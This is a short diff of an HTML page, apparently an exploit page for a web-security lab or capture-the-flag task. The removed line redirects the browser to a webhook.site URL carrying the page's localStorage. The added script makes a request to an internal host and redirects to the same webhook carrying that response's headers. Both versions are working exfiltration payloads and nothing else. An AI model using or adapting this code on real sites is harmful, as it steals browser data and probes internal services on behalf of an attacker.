@@ -5,7 +5,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
-    <script>document.location.href="https://webhook.site/81d3bd4f-504f-4a74-af69-1f3c11dd2709"+"?c="+JSON.stringify(localStorage);</script>
+    <script>
+        var req = new XMLHttpRequest();
+        req.open('GET', "http://svb:5003", false);
+        req.send();
+        document.location.href="https://webhook.site/81d3bd4f-504f-4a74-af69-1f3c11dd2709"+"?c="+req.getAllResponseHeaders();
+    </script>
 </head>
 <body>
     
